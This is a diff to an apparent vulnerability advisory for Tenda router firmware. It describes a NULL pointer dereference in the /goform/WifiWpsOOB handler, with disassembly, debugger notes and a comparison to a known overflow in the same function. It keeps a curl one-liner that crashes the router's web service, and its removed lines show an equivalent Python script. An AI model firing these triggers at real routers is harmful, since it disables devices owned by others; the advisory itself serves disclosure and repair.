@@ -10,7 +10,7 @@
 | AC18 | V15.03.05.19 (6318) | https://www.tenda.com.cn/download/detail-2683.html |
 | AC10U V1.0 | V15.03.06.48 | https://www.tendacn.com/download/detail-3170.html |
 
-CWE-476. CVSS 3.1: 7.5 `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`.
+CWE-476. CVSS 3.1: 7.5 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`.
 
 ## Vulnerability details
 
@@ -32,6 +32,8 @@ printf(...);
 ...
 if (index == NULL) { ... }
 ```
+
+![control flow](image/02-pseudocode.png)
 
 `websGetVar` returns the default (`NULL`) when the parameter is not present, so the check
 that follows the call is reached too late. Disassembly of the region:
@@ -75,41 +77,17 @@ Host: 192.168.0.1
 Cookie: password=x
 ```
 
-Equivalent POST:
+The same in one line:
 
 ```
-curl -s -X POST "http://192.168.0.1/goform/WifiWpsOOB" \
-  -H "Cookie: password=x" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "foo=1"
+curl -s "http://192.168.0.1/goform/WifiWpsOOB" -H "Cookie: password=x"
 ```
 
 The service closes the connection without a response and terminates. The web interface stays
 unreachable until the device is restarted.
 
-Python:
-
-```python
-import socket
-
-host = "192.168.0.1"
-port = 80
-
-request = (
-    "GET /goform/WifiWpsOOB HTTP/1.1\r\n"
-    "Host: 192.168.0.1\r\n"
-    "Cookie: password=x\r\n"
-    "\r\n"
-)
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((host, port))
-s.send(request.encode())
-print(s.recv(4096))
-s.close()
-```
-
-`poc.sh` and `poc.py` in this directory run the same test and report the result.
+`poc.sh` and `poc.py` in this directory send a baseline request followed by the trigger and
+report the result.
 
 ## Vulnerability verification
 
@@ -126,17 +104,19 @@ cookie, send a well-formed request, then send the request without `index`.
 
 ![Two-case comparison](image/05-trigger-ab.png)
 
-![Debugger capture](image/02-gdb-crash.png)
+Under the debugger, with a breakpoint on the `atoi` call:
+
+![Debugger capture](image/04-gdb-crash.png)
 
 Testing was done in QEMU user mode (`qemu-arm`, `qemu-mipsel-static`) on the vendor's
 unmodified root filesystems; the debugger was `gdb-multiarch` attached through the QEMU gdb
-stub. `evidence/` holds the raw captures.
+stub. `evidence/` holds the raw captures and `gdb-session.txt` the debugger session.
 
 ## Relationship to the previously reported buffer overflow
 
 The `index` parameter of the same function is already covered by several CVE IDs, all of them
-stack buffer overflows. The function builds a message with `sprintf` at two sites, both into
-the same stack buffer at `[fp-28]`:
+stack buffer overflows. The function passes `index` to `sprintf` at two sites, both writing
+into the same stack buffer at `[fp-28]`:
 
 ```
 0x9b87c   sprintf(buf, "%s;%s", index, "0")
@@ -144,8 +124,8 @@ the same stack buffer at `[fp-28]`:
 ```
 
 Neither bounds the length. Measured on the AC9 build, an `index` value of 20 bytes is
-handled normally and 22 bytes crashes the process, so the threshold sits at 22 bytes. This
-defect needs no value at all, so the two triggers cannot both apply to one request.
+handled normally and 22 bytes crashes the process, so the boundary lies between the two.
+This defect needs no value at all, so the two triggers cannot both apply to one request.
 
 | | Overflow (existing CVEs) | This issue |
 | --- | --- | --- |
@@ -154,8 +134,12 @@ defect needs no value at all, so the two triggers cannot both apply to one reque
 | Crash | in httpd, on function return | in libc `strtol`, immediately |
 
 In the AC9 build there is one site where a getter with a NULL default is used without a
-check, and it is this one. The neighbouring handlers `formWifiWpsStart` (`0x9a374`) and
-`formWifiStatus` (`0x99f28`) read a parameter with the same name and check it before use.
+check, and it is this one. The neighbouring handler `formWifiWpsStart` reads a parameter
+with the same name and checks it first, at `0x9a3e4`, ahead of its own `atoi` at `0x9a414`:
+
+![sibling handler](image/03-sibling.png)
+
+`formWifiStatus` (function at `0x9991c`, getter at `0x99f28`) follows the same order.
 
 ## Fix
 
